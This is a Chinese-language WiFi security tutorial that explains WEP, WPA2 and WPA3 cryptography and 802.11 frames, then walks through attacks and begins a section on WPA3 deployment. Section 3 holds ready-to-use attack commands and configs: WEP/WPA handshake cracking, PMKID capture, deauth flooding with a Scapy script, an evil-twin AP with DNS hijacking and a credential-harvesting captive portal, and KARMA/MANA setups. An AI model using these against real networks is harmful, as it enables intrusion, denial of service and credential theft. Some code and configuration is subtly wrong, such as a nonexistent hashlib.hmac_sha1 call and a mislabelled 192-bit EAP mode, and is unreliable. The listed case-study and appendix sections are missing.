# WiFi 安全攻防详解

> 本文档深入讲解 WiFi 安全的核心攻防技术，涵盖加密体系原理、协议帧结构、认证流程、各类攻击技术原理与实现、防御措施以及实战案例。面向有一定基础的安全学习者和从业者。

---

## 目录

1. [WiFi 加密体系详解](#1-wifi-加密体系详解)
2. [802.11 帧结构与认证关联流程](#2-80211-帧结构与认证关联流程)
3. [WiFi 攻击技术](#3-wifi-攻击技术)
4. [WiFi 防御措施](#4-wifi-防御措施)
5. [实战案例：Aircrack-ng 套件完整 WiFi 渗透流程](#5-实战案例aircrack-ng-套件完整-wifi-渗透流程)
6. [附录](#6-附录)

---

## 1. WiFi 加密体系详解

### 1.1 WEP（Wired Equivalent Privacy）

#### 1.1.1 WEP 加密原理

WEP 是 IEEE 802.11 标准最早定义的加密协议，使用 RC4 流密码进行数据加密：

```
WEP 加密流程：

1. 密钥组成
   ├── 共享密钥（40位或104位）
   └── 初始化向量 IV（24位，明文传输）
   总密钥 = IV(24) + Shared Key(40/104) = 64/128 位

2. 密钥流生成
   RC4(IV || Shared Key) → Keystream（密钥流）

3. 数据加密
   ├── 计算 ICV（Integrity Check Value）：CRC-32(明文)
   ├── 密文 = 明文 || ICV XOR Keystream
   └── 发送：IV（明文）+ 密文

4. 数据解密
   ├── 接收方使用相同的 IV 和共享密钥生成 Keystream
   ├── 还原：明文 || ICV = 密文 XOR Keystream
   └── 验证 ICV 完整性
```

#### 1.1.2 WEP 安全漏洞

WEP 存在根本性的安全设计缺陷：

```
漏洞1：IV 空间过小
├── IV 仅为 24 位，总共只有 2^24 = 16,777,216 种可能
├── 繁忙网络中数小时内 IV 必然重复
├── 相同 IV + 相同密钥 = 相同密钥流
└── 密钥流重用导致明文可恢复

漏洞2：IV 重用不受控制
├── 标准未规定 IV 选择算法
├── 很多设备上电后 IV 从 0 开始递增
└── 重启后 IV 重置，必然产生重用

漏洞3：RC4 弱密钥
├── 某些 IV 值导致 RC4 产生弱密钥流
├── FMS 攻击：收集特定格式的弱 IV 包
├── PTW 攻击：改进的统计攻击，需要更少的数据包
└── 通常 40,000-85,000 个包即可破解 104 位密钥

漏洞4：CRC-32 线性完整性
├── CRC-32 是线性函数，不依赖密钥
├── 攻击者可修改密文并相应修改 ICV
├── 无法提供真正的数据完整性保护
└── 允许位翻转攻击和注入攻击

漏洞5：无重放保护
├── 没有序列号或时间戳机制
├── 攻击者可重放捕获的数据包
└── ARP 重放攻击可快速产生大量流量
```

#### 1.1.3 WEP 破解原理

```
WEP 破解流程（PTW 攻击）：

1. 数据收集
   ├── 被动监听捕获加密数据包
   ├── 或主动注入 ARP 请求产生响应流量
   └── 需要约 40,000-85,000 个数据包

2. 弱 IV 分析
   ├── 识别特定格式的弱 IV 数据包
   ├── 统计每个密钥字节的投票
   └── 逐步恢复密钥的每个字节

3. 密钥验证
   ├── 使用候选密钥解密数据包
   └── 验证 ICV 是否正确

实际时间：
├── 64 位 WEP：5-10 分钟
├── 128 位 WEP：10-30 分钟
└── 取决于网络流量和注入成功率
```

### 1.2 WPA/WPA2（WiFi Protected Access）

#### 1.2.1 WPA-PSK 密钥派生

WPA-PSK（预共享密钥模式）的密钥派生过程：

```python
# WPA-PSK 密钥派生过程（Python 伪代码）

import hashlib
import binascii

def wpa_psk_to_pmk(ssid, password):
    """
    将密码和 SSID 转换为 PMK（成对主密钥）
    PMK = PBKDF2(password, ssid, 4096, 256)
    
    参数:
        ssid: 网络名称
        password: WiFi 密码（8-63 字符）
    返回:
        pmk: 256 位成对主密钥
    """
    pmk = hashlib.pbkdf2_hmac('sha1', 
                               password.encode('utf-8'), 
                               ssid.encode('utf-8'), 
                               4096,  # 4096 次迭代
                               32)    # 256 位输出
    return pmk

def pmk_to_ptk(pmk, ap_mac, sta_mac, anonce, snonce):
    """
    从 PMK 派生 PTK（成对临时密钥）
    PTK = PRF(PMK, "Pairwise key expansion", 
               min(AA,SPA) || max(AA,SPA) || 
               min(ANonce,SNonce) || max(ANonce,SNonce))
    
    参数:
        pmk: 成对主密钥（256位）
        ap_mac: AP 的 MAC 地址
        sta_mac: Station 的 MAC 地址
        anonce: AP 的 Nonce
        snonce: Station 的 Nonce
    返回:
        ptk: 成对临时密钥（WPA2: 384位, WPA: 512位）
    """
    # 保证 MAC 和 Nonce 的顺序一致性
    if ap_mac < sta_mac:
        mac_pair = ap_mac + sta_mac
    else:
        mac_pair = sta_mac + ap_mac
    
    if anonce < snonce:
        nonce_pair = anonce + snonce
    else:
        nonce_pair = snonce + anonce
    
    # 使用 PRF（伪随机函数）生成 PTK
    # PRF 使用 HMAC-SHA1
    data = b"Pairwise key expansion" + b'\x00' + mac_pair + nonce_pair
    
    ptk = b''
    for i in range(4):  # 生成 4 个块
        hmac_obj = hashlib.hmac_sha1(pmk, data + bytes([i]))
        ptk += hmac_obj.digest()
    
    return ptk[:48]  # 截取 384 位

# PTK 结构
"""
PTK 由三部分组成：
├── KCK（Key Confirmation Key, 128位）
│   └── 用于生成 MIC，验证握手消息完整性
├── KEK（Key Encryption Key, 128位）
│   └── 用于加密 GTK 等组密钥
├── TK（Temporal Key, 128位）
│   └── 用于数据帧加密
└── 64位额外空间（WPA2 中用于 MIC 密钥）
"""
```

#### 1.2.2 四次握手详解

四次握手（4-Way Handshake）是 WPA/WPA2 协议中最关键的认证过程：

```
四次握手详细流程：

准备工作：
├── PMK = PBKDF2(passphrase, SSID, 4096, 256)
├── PMK 在 PSK 模式下由密码和 SSID 派生
└── PMK 在 Enterprise 模式下由 RADIUS 服务器下发

消息1: AP -> Station
├── 内容: ANonce（AP 生成的随机数）
├── 作用: 向 Station 提供 AP 端的 Nonce
├── Station 此时可以计算 PTK
│   PTK = PRF(PMK, "Pairwise key expansion",
│              min(AA,SPA) || max(AA,SPA) ||
│              min(ANonce,SNonce) || max(ANonce,SNonce))
└── 不包含 MIC，无需验证

消息2: Station -> AP
├── 内容: SNonce + MIC(消息1的MIC)
├── Station 发送自己生成的 SNonce
├── 附带 MIC 码（用 KCK 计算）
├── AP 验证 MIC 码 → 确认 Station 拥有正确的 PMK
└── AP 此时可以计算 PTK

消息3: AP -> Station
├── 内容: GTK(加密后) + MIC
├── AP 发送加密的 GTK（组临时密钥）
├── GTK 用 KEK 加密
├── 包含 MIC 码确认
├── 通知 Station 安装 PTK 和 GTK
└── Station 验证 MIC → 确认 AP 拥有正确的 PMK

消息4: Station -> AP
├── 内容: ACK + MIC
├── Station 确认已安装密钥
├── AP 安装 PTK
└── 握手完成，开始加密通信

安全分析：
├── PMK 从不在空中传输
├── 握手通过 MIC 验证双方持有相同 PMK
├── PTK 每次连接重新生成（使用随机 Nonce）
├── 攻击者可捕获握手包进行离线破解
│   └── 暴力穷举密码 → 计算 PMK → 计算 PTK → 验证 MIC
└── 这就是 WPA/WPA2 可被离线字典攻击的根本原因
```

#### 1.2.3 WPA 与 WPA2 的区别

```
                  WPA                    WPA2
加密算法    TKIP (临时密钥完整性协议)    AES-CCMP
密钥长度        128 位                  128 位
完整性校验    Michael + CRC-32         AES-CCM
IV 长度        48 位                   48 位
密钥更新        每包变化                 每包变化
安全强度        中等                    强
兼容性          向下兼容 WEP            需要新硬件
已知漏洞     TKIP 注入、MIC             KRACK 攻击
            攻击、Beck-Tews           
```

#### 1.2.4 TKIP 安全分析

TKIP 是 WPA 为了兼容 WEP 硬件而设计的临时方案：

```
TKIP 加密机制：

1. 密钥混合（Key Mixing）
   ├── Phase 1: 临时密钥 = S-box(PMK, TA)
   │   └── 使用 MAC 地址参与计算
   ├── Phase 2: 每包密钥 = RC4(临时密钥, IV, PN)
   │   └── 每个包使用不同的 WEP Seed
   └── 解决了 WEP 直接使用共享密钥的问题

2. 序列计数器（TSC）
   ├── 48 位包序号（PN）
   ├── 每个包递增，防止重放
   └── 解决了 WEP 无重放保护的问题

3. Michael 完整性校验
   ├── 64 位 MIC 值
   ├── 专为硬件实现设计
   └── 比 CRC-32 强，但仍有弱点

TKIP 已知漏洞：
├── Beck-Tews 攻击（2008）
│   ├── 利用 Michael 弱点
│   ├── 短包（如 ARP）注入
│   └── 需要 QoS（802.11e）支持
├── Halvorsen-Haugen 攻击（2009）
│   ├── 改进的 Beck-Tews
│   └── 不需要 QoS 支持
└── MIC 攻击
    ├── Michael MIC 可被碰撞
    └── 可伪造数据包
```

### 1.3 WPA3（SAE）

#### 1.3.1 SAE 协议

WPA3 使用 SAE（Dragonfly 协议）替代 PSK，从根本上解决离线字典攻击问题：

```
SAE（Simultaneous Authentication of Equals）握手流程：

前提条件：
├── 双方共享密码（Password）
├── 双方知道群参数（椭圆曲线或有限域）
└── 密码到群元素的映射函数 PWE

1. 密码到元素（PWE）计算
   ├── 双方独立计算 PWE = f(password, counter)
   ├── 使用 hash-to-curve 或 hunting-and-pecking 方法
   └── PWE 是群中的元素（如椭圆曲线点）

2. Commit 交换
   ├── 双方各自生成随机数 r1, r2
   ├── 计算 Commit = (r * PWE) + mask
   ├── 交换 Commit 值
   └── 攻击者无法从 Commit 反推 PWE

3. Confirm 阶段
   ├── 双方各自计算共享密钥 K
   │   K = r2 * (Commit1 - mask1)
   ├── 验证 Confirm token
   └── 认证完成

4. 密钥派生
   ├── PMK = KDF(K, "SAE")
   └── PMK 用于后续四次握手

SAE 安全特性：
├── 抗离线字典攻击
│   └── 攻击者无法在不与 AP 交互的情况下验证密码猜测
├── 前向保密（Forward Secrecy）
│   └── 即使密码泄露，过去的通信仍安全
├── 抗 MITM
│   └── SAE 的认证机制防止中间人攻击
└── 密钥分离
    └── 每次会话使用独立的 PMK
```

#### 1.3.2 WPA3 版本对比

```
WPA3-Personal：
├── 使用 SAE 替代 PSK
├── 抗离线字典攻击
├── 前向保密
├── 适用于家庭和小型办公网络
└── 最低密码长度要求：8 字符

WPA3-Enterprise：
├── 基于 802.1X/EAP 认证
├── 192 位安全套件
│   ├── 加密: AES-256-GCM
│   ├── 密钥交换: ECDH-P384
│   ├── 签名: ECDSA-P384
│   └── 哈希: SHA-384
├── 适用于政府/金融等高安全场景
└── 向下兼容 WPA2-Enterprise

WPA3-Enterprise 192-bit Mode:
├── CNSA 2.0 套件
├── NIST SP 800-131A Rev2 兼容
├── RFC 8374 定义
└── 提供等同有线安全级别的保护
```

#### 1.3.3 OWE（Opportunistic Wireless Encryption）

```
OWE (RFC 8115) - 开放网络的加密：

问题：
└── 开放网络（无密码 WiFi）中数据完全明文传输

OWE 解决方案：
├── 使用 DH 密钥交换在无认证的情况下加密
├── Station 和 AP 交换公钥
├── 各自计算共享密钥
├── 使用共享密钥加密后续通信
└── 提供个体加密而非认证

局限性：
├── 不提供认证（无法防止 AP 伪造）
├── 仅提供加密保护
└── 需要客户端和 AP 同时支持 OWE

OWE 过渡模式：
├── 同时广播 OWE 和开放 SSID
├── 支持 OWE 的设备自动使用加密
└── 不支持的设备回退到开放连接
```

---

## 2. 802.11 帧结构与认证关联流程

### 2.1 802.11 帧类型

802.11 标准定义了三种帧类型，每种帧又分为多个子类型：

```
802.11 帧类型：

管理帧（Management Frames, Type=00）
├── Beacon（子类型 1000）
│   └── AP 周期性广播网络信息
├── Probe Request（子类型 0100）
│   └── Station 主动扫描请求
├── Probe Response（子类型 0101）
│   └── AP 响应扫描请求
├── Authentication（子类型 1011）
│   └── 认证请求/响应
├── Deauthentication（子类型 1100）
│   └── 解除认证
├── Association Request（子类型 0000）
│   └── 关联请求
├── Association Response（子类型 0001）
│   └── 关联响应
├── Disassociation（子类型 1010）
│   └── 解除关联
├── Action（子类型 1101）
│   └── 扩展管理操作
├── Reassociation Request/Response
│   └── 漫游重关联
└── ATIM（子类型 1001）
    └── 广播流量通告

控制帧（Control Frames, Type=01）
├── RTS（子类型 1011）- 请求发送
├── CTS（子类型 1100）- 清除发送
├── ACK（子类型 1101）- 确认
├── PS-Poll（子类型 1010）- 省电轮询
├── CF-End（子类型 1110）- 无竞争期结束
├── CF-End/CF-ACK（子类型 1111）
├── Block ACK Request（子类型 1000）
└── Block ACK（子类型 1001）

数据帧（Data Frames, Type=10）
├── Data（子类型 0000）- 普通数据
├── Data + CF-ACK（子类型 0001）
├── Data + CF-Poll（子类型 0010）
├── Data + CF-ACK + CF-Poll（子类型 0011）
├── Null Function（子类型 0100）- 空帧
├── QoS Data（子类型 1000）- 优先级数据
├── QoS Null（子类型 1100）
└── QoS CF-Poll/CF-ACK 变体
```

### 2.2 802.11 帧结构

```
802.11 MAC 帧格式：

  字节:  2        2        6        6        6       2      6       0-2312   4
       ┌────────┬────────┬────────┬────────┬────────┬──────┬───────┬────────┬──────┐
       │Frame   │Duration/│Address1│Address2│Address3│ Seq  │Address4│ Frame  │ FCS  │
       │Control │  ID     │ (RA)   │ (TA)   │ (DA)   │ Ctrl │        │ Body   │      │
       │(FC)    │         │        │        │        │      │ (可选) │        │      │
       └────────┴────────┴────────┴────────┴────────┴──────┴───────┴────────┴──────┘

Frame Control 字段详解（2字节/16位）：
  位:  0-1    2-3     4-7        8        9       10      11    12-13    14      15
      ┌────┬──────┬─────────┬────────┬────────┬────────┬─────┬───────┬────────┬──────┐
      │协议 │ 类型  │  子类型  │ To DS  │From DS │More Frag│Retry│Pwr Mgmt│MoreData│WEP  │
      │版本 │      │         │        │        │        │     │       │        │     │
      └────┴──────┴─────────┴────────┴────────┴────────┴─────┴───────┴────────┴──────┘

地址字段含义（取决于 To DS 和 From DS 标志）：

  To DS  From DS  Address1   Address2   Address3    Address4
   0       0       DA          SA         BSSID       N/A
   0       1       DA          BSSID      SA          N/A
   1       0       BSSID       SA         DA          N/A
   1       1       RA          TA         DA          SA
```

### 2.3 Beacon 帧解析

Beacon 帧是 AP 定期广播的管理帧，包含丰富的网络信息：

```python
# Beacon 帧关键字段解析（Scapy 代码示例）

from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt

def parse_beacon(packet):
    """
    解析 802.11 Beacon 帧，提取网络信息
    
    Beacon 帧包含的信息：
    - SSID: 网络名称
    - 支持的速率
    - 信道信息
    - 加密能力
    - RSN 信息（WPA2/WPA3）
    - BSS 加载
    - HT/VHT 能力
    """
    if packet.haslayer(Dot11Beacon):
        beacon = packet[Dot11Beacon]
        
        # 基本信息
        info = {
            'bssid': packet.addr3,        # AP 的 MAC 地址
            'beacon_interval': beacon.beacon_interval,  # Beacon 间隔（通常 100ms）
            'capability': beacon.cap,     # 能力信息
        }
        
        # 解析信息元素（IE）
        elt = packet.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 0:   # SSID
                info['ssid'] = elt.info.decode('utf-8', errors='ignore')
            elif elt.ID == 1:  # 支持的速率
                info['supported_rates'] = elt.info
            elif elt.ID == 3:  # 当前信道
                info['channel'] = struct.unpack('B', elt.info)[0]
            elif elt.ID == 7:  # 国家信息
                info['country'] = elt.info[:3].decode('utf-8')
            elif elt.ID == 48:  # RSN（WPA2/WPA3）
                info['rsn'] = parse_rsn(elt.info)
            elif elt.ID == 221:  # 厂商自定义（WPA 等）
                if elt.info.startswith(b'\x00P\xf2\x01\x01\x00'):
                    info['wpa'] = parse_wpa(elt.info)
            
            elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
        
        return info

def parse_rsn(rsn_data):
    """
    解析 RSN（Robust Security Network）信息元素
    
    RSN 包含：
    - 版本号
    - 组密码套件
    - 成对密码套件
    - 认证密钥管理（AKM）套件
    - RSN 能力
    """
    info = {}
    # 版本（2字节）
    info['version'] = struct.unpack('<H', rsn_data[:2])[0]
    # 组密码套件（4字节：OUI + 类型）
    info['group_cipher'] = parse_cipher_suite(rsn_data[2:6])
    # 成对密码套件数量
    pairwise_count = struct.unpack('<H', rsn_data[6:8])[0]
    # AKM 套件数量
    offset = 8 + pairwise_count * 4
    akm_count = struct.unpack('<H', rsn_data[offset:offset+2])[0]
    # 解析 AKM 类型
    # 00-0F-AC:01 = 802.1X
    # 00-0F-AC:02 = PSK
    # 00-0F-AC:08 = SAE (WPA3)
    # 00-0F-AC:09 = FT-SAE
    # 00-0F-AC:12 = OWE
    return info
```

### 2.4 认证与关联流程

```
WiFi 连接完整状态机：

状态1: 未认证、未关联
  │
  │  Station -> AP: Authentication Request
  │  (Open System: 无凭据)
  │  (Shared Key: 使用 WEP 密钥挑战)
  │
  ▼ AP -> Station: Authentication Response
  │  (Status: Successful)
  │
状态2: 已认证、未关联
  │
  │  Station -> AP: Association Request
  │  (包含: SSID, 支持的速率, RSN 能力, QoS 能力)
  │
  ▼ AP -> Station: Association Response
  │  (包含: AID, 支持的速率, 状态码)
  │
状态3: 已认证、已关联
  │
  │  WPA/WPA2: 四次握手
  │  WPA3: SAE 握手 → 四次握手
  │  802.1X: EAP 认证 → 四次握手
  │
  ▼ 密钥协商完成
  │
状态4: 已认证、已关联、已加密
  │
  │  正常数据传输
  │
  ▼

认证方式详解：

1. Open System Authentication（开放认证）
   ├── Station 发送认证请求
   ├── AP 返回成功响应
   ├── 实际不做任何认证
   └── 安全性依赖后续的 WPA/WPA2 握手

2. Shared Key Authentication（共享密钥认证）
   ├── AP 发送 128 字节挑战文本
   ├── Station 使用 WEP 密钥加密挑战
   ├── AP 验证加密结果
   ├── 认证通过后才允许关联
   └── 已被 WPA/WPA2 取代

3. 802.1X/EAP Authentication（企业认证）
   ├── Station <-> AP: EAP 消息通过 EAPoL 传输
   ├── AP <-> RADIUS: EAP 消息转发到 RADIUS 服务器
   ├── RADIUS 服务器验证用户凭据
   ├── 成功后 RADIUS 下发 PMK
   └── AP 和 Station 执行四次握手
```

---

## 3. WiFi 攻击技术

### 3.1 WEP 破解

```
WEP 破解完整流程：

工具: Aircrack-ng 套件

步骤1: 启用监听模式
├── airmon-ng check kill      # 终止冲突进程
├── airmon-ng start wlan0     # 启用监听模式
└── 生成 wlan0mon 接口

步骤2: 扫描目标网络
├── airodump-ng wlan0mon     # 扫描所有网络
├── 记录目标 AP 的 BSSID 和信道
├── 观察是否有已连接的 Station
└── 确认加密方式为 WEP

步骤3: 捕获数据包
├── airodump-ng -c <channel> --bssid <BSSID> -w wep_capture wlan0mon
├── 被动等待数据积累
└── 目标: 收集足够的 IV 数据包

步骤4: ARP 请求注入（加速数据收集）
├── aireplay-ng -3 -b <BSSID> -h <STATION_MAC> wlan0mon
├── 注入 ARP 请求产生大量响应
├── 如果没有关联的 Station，使用伪造认证
│   └── aireplay-ng -1 0 -a <BSSID> -h <FAKE_MAC> wlan0mon
└── 数据速率可提升到每秒数百个 IV

步骤5: 破解密钥
├── aircrack-ng -b <BSSID> wep_capture-01.cap
├── 当收集到足够的 IV（通常 40,000+）时
├── PTW 攻击自动恢复密钥
└── 输出: KEY FOUND! [ AA:BB:CC:DD:EE ]

时间估计:
├── 高流量网络: 3-5 分钟
├── 低流量网络: 10-30 分钟
└── 使用注入: 大幅缩短时间
```

### 3.2 WPA/WPA2 握手包抓取与离线破解

```
WPA/WPA2 破解流程：

步骤1: 扫描并定位目标
airodump-ng wlan0mon
→ 识别目标 AP: BSSID, 信道, 加密方式(WPA2-PSK)

步骤2: 针对性抓包
airodump-ng -c <channel> --bssid <BSSID> -w wpa_capture wlan0mon
→ 等待合法客户端连接/重连
→ 抓取四次握手包（EAPOL 消息）

步骤3: 加速握手包获取（Deauth 攻击）
aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
→ 发送 5 个 Deauth 帧
→ 强制客户端断开重连
→ 客户端重连时产生握手包
→ airodump-ng 界面显示 WPA handshake

步骤4: 离线密码破解
# 方法A: 使用 aircrack-ng
aircrack-ng -w wordlist.txt wpa_capture-01.cap

# 方法B: 使用 hashcat（GPU 加速）
# 先转换为 hashcat 格式
hashcat -m 2500 wpa_capture-01.hccapx wordlist.txt

# 方法C: 使用 John the Ripper
# 转换格式
hccap2john wpa_capture-01.hccap > hash.txt
john --wordlist=wordlist.txt hash.txt

破解时间估算：
├── 8 字符纯小写字母: CPU 约 2-3 天, GPU 约 1-2 小时
├── 8 字符字母+数字: CPU 约 2 周, GPU 约 1 天
├── 10 字符字母+数字: CPU 数月, GPU 约 1 周
└── 强密码（12+字符混合）: 实际不可行

字典优化建议：
├── 使用手机号字典（国内常见）
├── 使用常见密码 Top 10000
├── 使用 CUPP 定制化字典
├── 使用规则变形（大小写、数字后缀等）
└── 使用 hashcat 规则文件
```

### 3.3 PMKID 攻击

PMKID 攻击是 2018 年由 Jens Steube 发现的新型 WPA2 攻击方法，无需等待客户端连接：

```
PMKID 攻击原理：

PMKID 介绍：
├── PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_STA)
├── 部分支持漫游的 AP 在关联时发送 PMKID
├── PMKID 在第一次 EAPOL 消息中传输
└── 不需要四次握手，仅需一个帧

攻击优势：
├── 不需要客户端在线
├── 不需要执行 Deauth 攻击
├── 不需要等待握手包
├── 更隐蔽，不产生异常流量
└── 仅需与 AP 交互

攻击流程：
# 步骤1: 使用 hcxdumptool 捕获 PMKID
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng

# 或使用 hcxtools 直接请求 PMKID
hcxdumptool -i wlan0mon --filterlist_ap=<BSSID> --enable_status=1

# 步骤2: 转换为 hashcat 格式
hcxpcaptool -z pmkid_hash.txt pmkid.pcapng

# 步骤3: 离线破解
hashcat -m 16800 pmkid_hash.txt wordlist.txt

# 步骤4: 也可使用 airgeddon 等自动化工具
# 支持的 AP 特征：
# - 启用了 RSN（WPA2）
# - 支持漫游（802.11r）
# - 使用 PMKID 缓存

注意事项：
├── 并非所有 AP 都支持 PMKID
├── 主要影响使用 PMK 缓存的 AP
├── WPA3 不受此攻击影响
└── 是对 WPA2 的重大威胁
```

### 3.4 Evil Twin 攻击

```
Evil Twin（邪恶双子）攻击：

攻击原理：
├── 部署一个与合法 AP 相同 SSID 的伪造 AP
├── 使用相同或相似的 BSSID（MAC 地址）
├── 提供更强的信号吸引客户端连接
├── 可配合 Captive Portal 窃取凭据
└── 实施中间人攻击

工具配置示例（使用 hostapd）：

# hostapd 配置文件（evil_twin.conf）
cat > /tmp/evil_twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=Target_Network    # 与目标相同的 SSID
hw_mode=g
channel=6              # 与目标相同或不同信道
macaddr_acl=0
ignore_broadcast_ssid=0

# 如果使用开放网络 + Portal
auth_algs=1

# 如果使用 WPA2（需要知道密码）
#wpa=2
#wpa_passphrase=known_password
#wpa_key_mgmt=WPA-PSK
#wpa_pairwise=CCMP

# 如果使用 802.1X（需要 RADIUS）
#ieee8021x=1
#eapol_version=2
#eap_server=0
#radius_server_clients=/etc/hostapd/radius_clients
EOF

# 启动 Evil Twin AP
hostapd /tmp/evil_twin.conf

# 配置 DHCP 服务
dnsmasq --interface=wlan0 --dhcp-range=192.168.50.10,192.168.50.100,12h

# 配置 Captive Portal（使用 nginx + PHP）
# 重定向所有 HTTP 请求到登录页

# 配置 DNS 劫持
dnsmasq --address=/#/192.168.50.1

攻击增强：
├── 使用 Deauth 攻击断开客户端与合法 AP 的连接
├── 调高伪造 AP 的发射功率
├── 使用相同的 BSSID 增加迷惑性
├── 使用 5GHz 频段减少干扰
└── 伪造 Captive Portal 页面收集凭据
```

### 3.5 KARMA 攻击

```
KARMA 攻击原理：

背景知识：
├── 客户端的"已知网络"列表（Preferred Network List, PNL）
├── 客户端会主动发送 Probe Request 寻找已知网络
├── Probe Request 包含目标 SSID（主动扫描模式）
└── 也可使用广播 Probe Request（隐藏 SSID 模式）

KARMA 攻击流程：
├── 攻击者监听所有 Probe Request
├── 对于每个收到的 Probe Request
│   ├── 提取请求的 SSID
│   ├── 配置 AP 响应该 SSID
│   └── 发送匹配的 Probe Response
├── 客户端认为找到了已知网络
├── 自动连接到攻击者的 AP
└── 攻击者获得中间人位置

MANA 攻击（KARMA 的改进版）：
├── 解决了现代设备不发送定向 Probe 的问题
├── 收集广播 Probe Request
├── 响应所有已知 SSID
├── 维护"已知网络"数据库
├── 当客户端关联时，记录其 PNL
└── 使用这些信息提高成功率

工具实现：
# 使用 hostapd-mana
cat > /tmp/mana.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=RandomSSID
hw_mode=g
channel=6

# MANA 配置
mana_wpaout=/tmp/mana.hccap
mana_loud=1
mana_ssid=KnownNetwork1,KnownNetwork2

# 或使用 bettercap
# sudo bettercap -interface wlan0mon
# > wifi.recon on
# > wifi.deauth <BSSID>
# > set wifi.ap.ssid TargetSSID
# > wifi.ap on
EOF

防御措施：
├── 现代 OS 已禁用定向 Probe Request
├── 使用 WPA3 增强认证
├── 企业环境部署证书验证
├── 客户端配置"不自动连接未知网络"
└── WIDS 检测异常 AP 行为
```

### 3.6 Deauth/Disassociate DoS 攻击

```
Deauth 攻击：

原理：
├── 802.11 管理帧默认不加密
├── 伪造 Deauth/Disassociate 帧发送给客户端或 AP
├── 客户端被迫断开连接
├── WPA2 不提供管理帧保护
└── WPA3 的 PMF（Protected Management Frames）可缓解

Deauth 帧格式：
├── Type: Management (00)
├── Subtype: Deauthentication (1100)
├── Address1: 目标 MAC（客户端或 AP）
├── Address2: 源 MAC（伪造的 AP 或客户端）
├── Address3: BSSID
├── Reason Code: 常用值
│   ├── 1 = Unspecified
│   ├── 4 = Deauth due to inactivity
│   ├── 7 = Class 3 frame from non-associated STA
│   └── 15 = 4-way handshake timeout

攻击命令：
# 使用 aireplay-ng
aireplay-ng -0 0 -a <BSSID> -c <CLIENT_MAC> wlan0mon
# -0 0 = 持续发送 Deauth
# -0 5 = 发送 5 次

# 使用 mdk4/mdk3
mdk4 wlan0mon d -b <BSSID> -c <CLIENT_MAC>
# d = Deauth 模式

# 使用 Python/Scapy
from scapy.all import *
def send_deauth(iface, ap_mac, client_mac):
    pkt = RadioTap()
    pkt /= Dot11(type=0, subtype=12,  # Deauth 帧
                 addr1=client_mac,
                 addr2=ap_mac,
                 addr3=ap_mac)
    pkt /= Dot11Deauth(reason=7)
    sendp(pkt, iface=iface, count=100, inter=0.1)

PMF（Protected Management Frames）防御：
├── 802.11w 标准
├── 加密部分管理帧（Deauth/Disassoc 等）
├── WPA3 强制启用 PMF
├── WPA2 可选启用 PMF
├── 但并非所有客户端支持
└── 部署时需注意兼容性
```

### 3.7 KRACK 攻击

```
KRACK（Key Reinstallation Attack）：

发现者: Mathy Vanhoef (2017)
影响: WPA1/WPA2 所有版本

攻击原理：
├── 利用四次握手状态机缺陷
├── 在第三次握手时阻断/延迟消息
├── AP 重传第三次握手消息
├── Station 每次接收都会重装 PTK
├── 重装密钥导致:
│   ├── 重置包序号（PN）计数器
│   ├── 重置 TX/RX 随机数
│   └── 密钥流重用

攻击流程：
1. 攻击者中间人位置（需先实施信道攻击）
2. 阻断 Station 接收消息3的重传
3. AP 因未收到消息4的重传而重发消息3
4. Station 重新安装已安装的 PTK
5. PN 计数器重置为之前值
6. 后续数据包使用已用过的 PN
7. 攻击者收集相同 PN 的密文
8. 通过已知明文攻击恢复密钥流
9. 可解密部分上行流量

影响分析：
├── 可解密 Station 到 AP 的数据
├── TKIP 配置下可注入数据包
├── CCMP 配置下仅解密不能注入
├── GCMP 配置下可解密和注入
├── Android/Linux 的 wpa_supplicant 影响最大
│   └── 安卓 6.0+ 在消息3重传时重装全零密钥
└── 所有支持 WPA2 的设备均受影响

修复措施：
├── 修补 wpa_supplicant 和 hostapd
├── 确保密钥只安装一次
├── 使用 PN 不回退机制
├── 所有厂商已发布补丁
└── 但旧设备可能永远无法修复

实际限制：
├── 需要中间人位置（信道级攻击）
├── 只能解密少量数据包
├── 不能直接恢复 PMK 或密码
└── 攻击复杂度较高
```

### 3.8 Fragmentation 攻击

```
Fragmentation 攻击（分段攻击）：

原理：
├── 802.11 支持数据帧分段
├── 分段帧使用相同的密钥流
├── 如果能获取一个分段的明文
├── 可以推算出密钥流
└── 进而解密/伪造其他分段

Beck-Tews 攻击（2008）：
├── 针对 TKIP 的攻击
├── 利用 TKIP 的 Michael 弱点
├── 需要客户端使用 QoS（802.11e）
├── 攻击步骤：
│   1. 执行 Deauth 攻击
│   2. 捕获 ARP 请求
│   3. 利用 TKIP 分段弱点
│   4. 篡改并注入数据
│   └── 每个包注入需要约 12 分钟
└── 适用于 WPA-TKIP 配置

改进攻击（Tews-Weinmann-Pyshkin）：
├── 不需要 QoS 支持
├── 利用更广泛的 TKIP 弱点
└── 但需要更多数据包

实际影响：
├── 仅影响使用 TKIP 的网络
├── AES-CCMP 不受影响
├── 推动了 TKIP 的废弃
└── 现代网络应使用 CCMP/GCMP
```

---

## 4. WiFi 防御措施

### 4.1 WPA3 部署

```
WPA3 部署指南：

迁移策略：
├── 评估现有设备兼容性
├── 优先升级 AP 固件支持 WPA3
├── 使用 WPA3/WPA2 过渡模式
│   ├── 同时支持 WPA2 和 WPA3
│   ├── 新设备使用 WPA3
│   └── 旧设备回退 WPA2
├── 逐步淘汰不支持 WPA3 的旧设备
└── 最终切换到纯 WPA3 模式

WPA3-Personal 配置（hostapd）：
# hostapd.conf
ssid=SecureNetwork
wpa=2                    # 或 wpa=3 同时支持 WPA2
wpa_key_mgmt=SAE         # WPA3 Personal
sae_password=MyPassword  # WPA3 密码
ieee80211w=2             # 强制 PMF
sae_groups=19 20 21      # 支持的椭圆曲线组
# 19 = P-256, 20 = P-384, 21 = P-521

WPA3-Enterprise 配置：
ssid=EnterpriseNetwork
wpa=2
wpa_key_mgmt=WPA-EAP-SHA256  # 192-bit mode
ieee80211w=2                  # 强制 PMF
eap_server=1
eap_user_file=/etc/hostapd/eap_users
ca_cert=/etc/hostapd/ca.pem
server_cert=/etc/hostapd/server.pem
private_key=/etc/hostapd/server.key
# 192-bit 安全套件
openssl_ciphers=SUITEB192

OWE 配置（开放网络加密）：
ssid=OpenNetwork
wpa=2
wpa_key_mgmt=OWE
ieee80211w=2
